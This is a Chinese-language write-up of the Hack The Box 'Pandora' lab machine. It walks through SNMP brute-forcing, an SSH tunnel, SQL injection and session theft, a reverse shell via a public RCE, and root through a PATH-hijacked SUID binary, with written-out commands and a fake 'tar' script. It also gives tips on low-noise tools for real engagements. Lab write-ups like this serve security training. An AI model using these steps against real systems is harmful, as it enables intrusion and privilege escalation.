## 1. 執行摘要 (Executive Summary)

### 測試範圍與目標：
1. 靶機名稱:Pandora
2. 難度:Easy
3. IP:10.129.8.126

### 主要發現：
1. 漏洞 ：（風險等級：）
2. 漏洞 ：（風險等級：）

### 攻擊鏈摘要：

### 潛在影響：

### 修復建議：

---

## 2. 技術發現與攻擊路徑詳述 (Findings)

### 2.1 資訊蒐集(Reconnaissance)

使用Nmap掃描開放埠
```bash
sudo nmap -sT -Pn --min-rate 5000 -p- 10.129.8.126
sudo nmap -sT -Pn -sV -sC -O -p99,22,80 10.129.8.126
sudo nmap --script=vuln -p22,80 10.129.8.126
```
<img width="785" height="242" alt="螢幕擷取畫面 2026-03-18 223619" src="https://github.com/user-attachments/assets/e3c7be73-768f-433a-b93b-625d46e5358a" />
<img width="932" height="489" alt="螢幕擷取畫面 2026-03-18 223715" src="https://github.com/user-attachments/assets/1bd499e3-dcaa-4556-a473-3412cd50b24d" />
<img width="737" height="414" alt="螢幕擷取畫面 2026-03-18 223759" src="https://github.com/user-attachments/assets/477a3551-7e26-44d7-85d4-7a254940a048" />

探索80主頁(包含whatweb、原始碼、JS等等)

<img width="1327" height="830" alt="螢幕擷取畫面 2026-03-18 223814" src="https://github.com/user-attachments/assets/088d478f-444f-44bd-b33a-a2ed0a0df1a3" />

將找到的URL加入/etc/hosts
```bash
sudo vim /etc/hosts
```
<img width="510" height="250" alt="螢幕擷取畫面 2026-03-18 223918" src="https://github.com/user-attachments/assets/4225f58d-517a-45a9-82c2-7dff92001c09" />


### 2.2 枚舉(Enumeration)

使用gobuster爆破目錄
```bash
sudo gobuster dir -u http://panda.htb -w /usr/share/wordlists/dirb/common.txt
```
<img width="785" height="510" alt="螢幕擷取畫面 2026-03-18 224327" src="https://github.com/user-attachments/assets/01857877-a39c-488a-88ba-9297abd31947" />

使用ffuf爆破子網域
```bash
sudo ffuf -u http://10.129.8.126 -H "HOST: FUZZ.panda.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-topmillion-5000.txt -mc all -ac
```
<img width="1401" height="508" alt="螢幕擷取畫面 2026-03-18 225952" src="https://github.com/user-attachments/assets/3dd5fcb8-298c-4770-9993-088d4b68ef13" />

懷疑80是兔子洞，使用nmap針對UDP協議進行掃描
```bash
sudo nmap -sU --top-ports 20 10.129.8.126
```
(原則上，如果靶機只開放22,80兩個ports，我不會一開始就進行UDP掃描，要等我開始懷疑80是兔子洞時我才會掃；如果除了22,80以外還有其他ports開放的話，我就會在最一開始掃UDP。)

<img width="623" height="542" alt="螢幕擷取畫面 2026-03-18 230006" src="https://github.com/user-attachments/assets/f9475df8-f533-46d1-a865-d44ba3779c9f" />


### 2.3 初始存取(Initial Access)

SNMP簡單網路管理協定，對滲透測試來說是非常有價值的攻擊面，最初設計用於讓管理員遠端監視與管理網路設備，往往因為設定不當而洩漏大量敏感資訊。

使用onesixtyone對社群字串進行爆破
```bash
onesixtyone -c /usr/share/wordlist/seclists/Discovery/SNMP/snmp-onesixtyone.txt 10.129.8.126
```
原則上onesixtyone屬於中等噪音的工具，在實戰中並不適合，實戰中可以使用Nmap的snmp-brute腳本並微調速率，或是用Metasploit的snmp_login模組去調節，總而言之，別用snmpwalk。

<img width="969" height="110" alt="螢幕擷取畫面 2026-03-18 230612" src="https://github.com/user-attachments/assets/d7e85a27-859c-459b-aff4-c651ba06d4a3" />

使用snmpget配合社群字串public枚舉資訊，關於OID碼，可上網查表

<img width="1035" height="151" alt="螢幕擷取畫面 2026-03-18 230830" src="https://github.com/user-attachments/assets/48fa4624-3065-488f-b54c-0793867bb554" />

手動枚舉行程

<img width="614" height="637" alt="螢幕擷取畫面 2026-03-18 231401" src="https://github.com/user-attachments/assets/52f217c3-f99a-48ef-a472-d8de1d20571a" />

針對可疑行程進行深度枚舉，獲得使用者明文憑證

<img width="1077" height="234" alt="螢幕擷取畫面 2026-03-18 232657" src="https://github.com/user-attachments/assets/704b3be2-3526-4648-ad92-2a34b74df9d1" />

使用ssh連線

<img width="746" height="249" alt="螢幕擷取畫面 2026-03-18 232758" src="https://github.com/user-attachments/assets/bd508124-1649-490d-86de-d88fba4c297b" />
<img width="672" height="316" alt="螢幕擷取畫面 2026-03-18 232822" src="https://github.com/user-attachments/assets/eb442640-f063-4d71-8068-74bc5aa18b25" />

無法取得user.txt，嘗試橫向移動，我在這裡注意到matt的家目錄下沒有.ssh

<img width="659" height="274" alt="螢幕擷取畫面 2026-03-18 232848" src="https://github.com/user-attachments/assets/6c7e9770-1e03-4526-9f33-e6c063243d80" />

### 2.4 橫向移動(Lateral Movement)

探索目錄後，發現/var/www下除了html外還有pandora目錄，內容看起來像是另一個網站

<img width="370" height="72" alt="螢幕擷取畫面 2026-03-18 233558" src="https://github.com/user-attachments/assets/2962c8c4-fb10-4eda-aab1-2eba31429dba" />
<img width="1660" height="201" alt="螢幕擷取畫面 2026-03-18 233625" src="https://github.com/user-attachments/assets/a0088fdb-6563-43a8-8631-c0087e2be35e" />

使用netstat枚舉內網服務
```bash
netstat -tuplen
```
<img width="1136" height="282" alt="螢幕擷取畫面 2026-03-19 000647" src="https://github.com/user-attachments/assets/12402603-747a-4bdb-9399-536eecd2c48b" />

使用curl確認內網80是否可疑
```bash
surl 127.0.0.1:80
```
<img width="803" height="70" alt="螢幕擷取畫面 2026-03-19 000720" src="https://github.com/user-attachments/assets/1d9f5a76-5f7c-4ace-87c0-2df29a8572d4" />

使用ssh穿隧連接80
```bash
ssh -L 9001:localhost:80 daniel@panda.htb
```

<img width="1080" height="756" alt="螢幕擷取畫面 2026-03-19 000928" src="https://github.com/user-attachments/assets/a6234d60-26eb-49ce-bc11-44f790297276" />

連接localhost:9001

<img width="1245" height="793" alt="螢幕擷取畫面 2026-03-19 000940" src="https://github.com/user-attachments/assets/c73d1678-8e07-4a05-ae29-a31f0b2ffce2" />

探查網站資訊，有多則公開漏洞資訊

<img width="984" height="674" alt="螢幕擷取畫面 2026-03-19 001009" src="https://github.com/user-attachments/assets/564d804b-4ebb-4b7b-a299-041f20905a5f" />
<img width="1324" height="661" alt="螢幕擷取畫面 2026-03-19 001535" src="https://github.com/user-attachments/assets/2bfd2382-56c6-4136-a817-8c2d726252df" />
<img width="1470" height="642" alt="螢幕擷取畫面 2026-03-19 001632" src="https://github.com/user-attachments/assets/818cf146-c364-424e-ac6a-32c746f4c0ac" />
<img width="1018" height="707" alt="螢幕擷取畫面 2026-03-19 001900" src="https://github.com/user-attachments/assets/38bc6278-0577-45f5-a6c3-4f67d12cf167" />

配合公開漏洞資訊，使用SQLi

<img width="1276" height="301" alt="螢幕擷取畫面 2026-03-19 002008" src="https://github.com/user-attachments/assets/cff99c89-dc1b-4cc9-a58d-5069f72453a2" />

使用order by進行枚舉

<img width="1255" height="277" alt="螢幕擷取畫面 2026-03-19 002149" src="https://github.com/user-attachments/assets/1f73aed1-282b-46fe-b1ad-5b43618284ce" />
<img width="1249" height="244" alt="螢幕擷取畫面 2026-03-19 002209" src="https://github.com/user-attachments/assets/8635717a-5a77-40b2-8b85-0b1a1ca6d26a" />

是基於錯誤訊息的SQLi，我使用相應的payload進行枚舉

<img width="1464" height="548" alt="螢幕擷取畫面 2026-03-19 004147" src="https://github.com/user-attachments/assets/c1fb13bc-27b9-4143-bfe7-eb74bd2635f1" />
<img width="1201" height="535" alt="螢幕擷取畫面 2026-03-19 004303" src="https://github.com/user-attachments/assets/e0711a1e-b14c-401e-8815-b630640f7034" />
<img width="1124" height="284" alt="螢幕擷取畫面 2026-03-19 004723" src="https://github.com/user-attachments/assets/47ae4022-b606-4f25-9f1c-5cf0974fd5c7" />
<img width="1258" height="271" alt="螢幕擷取畫面 2026-03-19 004842" src="https://github.com/user-attachments/assets/4c1d9e11-332a-4958-b95c-5cdf7d04aa11" />
<img width="1201" height="263" alt="螢幕擷取畫面 2026-03-19 004947" src="https://github.com/user-attachments/assets/145942eb-c17e-4e1e-a350-293f92e6f0b9" />

在枚舉過程中，我了解到憑證密碼是哈希，但無法爆破，內部有個表負責存用戶session，所以我轉向竊取session

<img width="1248" height="266" alt="螢幕擷取畫面 2026-03-19 010126" src="https://github.com/user-attachments/assets/007fd1ac-05a6-436c-a96c-d034f69e29c8" />

在session表中，只有一個session屬於matt，其他的都會以admin身分進入，admin會橫向移動失敗，我手動嘗試了非常久才找到matt的session，若講求效率，最好是一開始就用Burp Suite去爆破

<img width="1903" height="718" alt="螢幕擷取畫面 2026-03-19 011120" src="https://github.com/user-attachments/assets/acaddddd-c3ea-4742-8c81-62236dd82069" />

我使用Burp Suite鎖定matt的session

<img width="1118" height="677" alt="螢幕擷取畫面 2026-03-19 012624" src="https://github.com/user-attachments/assets/1645f47f-75f6-462a-b086-df74c18861c4" />

配合另一個遠端程式碼執行公開漏洞，先利用Burp Suite攔截View events的POST請求

<img width="594" height="421" alt="螢幕擷取畫面 2026-03-19 012655" src="https://github.com/user-attachments/assets/8490eff2-23a9-44c7-aae5-16231cb44582" />
<img width="620" height="499" alt="螢幕擷取畫面 2026-03-19 012718" src="https://github.com/user-attachments/assets/7636a336-1793-4d2a-9732-0d92022736cd" />

啟動nc監聽
```bash
nc -lvnp 1234
```
<img width="339" height="177" alt="螢幕擷取畫面 2026-03-19 012822" src="https://github.com/user-attachments/assets/e61efa5f-7d8e-4e96-8b3b-7b3f89d62b96" />

傳送payload

<img width="609" height="427" alt="螢幕擷取畫面 2026-03-19 012843" src="https://github.com/user-attachments/assets/6fad5919-bf67-4ad7-9ee0-b4d11d3a80ed" />

取得反彈Shell和user.txt

<img width="764" height="284" alt="螢幕擷取畫面 2026-03-19 012855" src="https://github.com/user-attachments/assets/52e2982e-5e82-4886-aa36-55f8f731d96d" />
<img width="582" height="139" alt="螢幕擷取畫面 2026-03-19 012923" src="https://github.com/user-attachments/assets/c1f58314-af24-44f5-905c-2d26417bf28b" />



### 2.5 權限提升(Privilege Escalation)

取得的反彈Shell穩定性非常差，隔幾分鐘就會斷線，我決定使用ssh公鑰嘗試連接
```bash
ssh-keygen -t rsa -b 4096
```

<img width="662" height="589" alt="螢幕擷取畫面 2026-03-19 013357" src="https://github.com/user-attachments/assets/cf685dc4-c1ee-4815-950a-c7d07fd4b263" />

在家目錄建立.ssh目錄
```bash
mkdir .ssh
```
<img width="353" height="40" alt="螢幕擷取畫面 2026-03-19 014036" src="https://github.com/user-attachments/assets/b770f0de-6188-4fd3-87f2-7ec9e9f5882c" />

建立authorized_keys檔
```bash
echo 'ssh-rsa .....' > authorized_keys
```

<img width="618" height="96" alt="螢幕擷取畫面 2026-03-19 014104" src="https://github.com/user-attachments/assets/6c711cab-d8e6-4f05-addd-90e1a4dc1225" />

檢查內容

<img width="490" height="114" alt="螢幕擷取畫面 2026-03-19 014118" src="https://github.com/user-attachments/assets/8ba95ba4-04f0-4c83-90b1-614ad56f3456" />

分配權限，.ssh目錄為700，authorized_keys為600

<img width="800" height="85" alt="螢幕擷取畫面 2026-03-19 014141" src="https://github.com/user-attachments/assets/ddbedd66-aab0-42b5-93d8-11ba6ef3f980" />

成功ssh連接

<img width="739" height="240" alt="螢幕擷取畫面 2026-03-19 014156" src="https://github.com/user-attachments/assets/84322f4a-5196-44c7-8de0-b7241e2414da" />
<img width="446" height="160" alt="螢幕擷取畫面 2026-03-19 014215" src="https://github.com/user-attachments/assets/f81cb0ef-b152-4859-81ac-56260a0c0e17" />

探索SUID文件，找到可疑backup檔
```bash
find / -perm -u=s -type f 2>/dev/null
```
<img width="491" height="358" alt="螢幕擷取畫面 2026-03-19 014416" src="https://github.com/user-attachments/assets/7cfb94d7-cd46-4f12-a17f-17bab9732547" />

因backup檔執行後會跳出非常多東西，我打算先用strings查看，但並沒有安裝，所以我先使用ltrace查看
```bash
which strings
which ltrace
```
<img width="327" height="59" alt="螢幕擷取畫面 2026-03-19 014617" src="https://github.com/user-attachments/assets/5c9ce8c1-0028-4f29-978c-6e488e21f2b0" />

使用ltrace查看，發現system函數中tar並未用絕對路徑，可嘗試路徑劫持

<img width="1043" height="288" alt="螢幕擷取畫面 2026-03-19 014630" src="https://github.com/user-attachments/assets/4e7054ec-3240-4b07-aafc-eb1fc4d96830" />

嘗試路徑劫持
```bash
echo $PATH
export PATH=/dev/shm:$PATH
echo $PATH
```
<img width="1014" height="138" alt="螢幕擷取畫面 2026-03-19 014750" src="https://github.com/user-attachments/assets/82b23b49-e119-498d-9ce6-0f773a4503ec" />

在/dev/shm目錄下建立假tar，在其中寫入提權邏輯，並賦予執行權限
```bash
cat << EOF > tar
#!/bin/bash

bash
EOF
```
```bash
chmod +x tar
```

<img width="400" height="225" alt="螢幕擷取畫面 2026-03-19 015052" src="https://github.com/user-attachments/assets/e87c92a7-4546-4ff5-ae05-9e84b7f06a7c" />

直接呼叫backup，提權成功

<img width="459" height="166" alt="螢幕擷取畫面 2026-03-19 015140" src="https://github.com/user-attachments/assets/68a90984-eabe-473d-83c0-887bf118e9c8" />





### 2.6 最終成果(Impact)

獲得root.txt


<img width="994" height="201" alt="螢幕擷取畫面 2026-03-19 015219" src="https://github.com/user-attachments/assets/fb007339-87ae-4ce9-b483-07cce11a0f1a" />




---

## 3. 學習回顧 (Lessons Learned)

### 成功的部分：

1. 我個人認為這個靶機應該要設置成Medium難度，只有Easy可惜了。
2. 及時回頭進行UDP掃描，並未在80花太多時間。
3. snmp爆破時，使用nmap實在太慢，故我使用噪音相對高的onesixtyone，不過原理要知道，否則實戰時手足無措。
4. snmp枚舉只要照著OID表查，很快能找到可用資訊，不需要一開始就snmpwalk，應該嘗試低噪音手動工具。
5. SQLi其實只要找對payload，並不會花太長時間，只是找matt的session太慢。
6. 切換成ssh連線很果斷，因為一開始我就記得matt沒有.ssh目錄，這讓我從一開始就決定ssh公鑰連接。
7. 路徑劫持已經很熟練了。


### 浪費時間的部分：

1. 如果從最初掃描時就進行UDP掃描，或許可省去探索80主頁的時間。
2. SQLi應該直接使用Burp Suite，可節省很多時間，找到matt的session真的花太久時間了。

### 新知識點：

1. 關於snmp枚舉時各工具的噪音大小排名。
2. 關於使用Burp Suite固定session的使用方法。

### 與實戰對應：

1. 全程能手動就手動，若低噪音工具太耗時，我會先了解相關原理後使用相對高一點噪音的工具。
2. 在打完靶機後，我的電腦經歷了Windows更新變磚災情，拖了一個禮拜左右才寫write up，電腦自動更新前須注意更新內容是否有災情。


